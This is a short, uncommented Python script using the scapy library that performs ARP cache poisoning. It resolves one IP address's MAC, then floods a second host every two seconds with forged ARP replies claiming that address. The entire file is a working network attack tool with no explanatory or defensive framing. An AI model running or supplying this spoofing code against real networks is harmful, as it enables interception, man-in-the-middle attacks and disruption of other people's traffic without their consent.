#!/usr/bin/env python

from scapy.all import *
from subprocess import call
import time

arp_req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=sys.argv[1])
arp_ans = srp1(arp_req)
arp = ARP(op=2, psrc=sys.argv[1], pdst=sys.argv[2], hwdst=arp_ans[ARP].hwsrc)

while 1:
    send(arp)
    time.sleep(2)
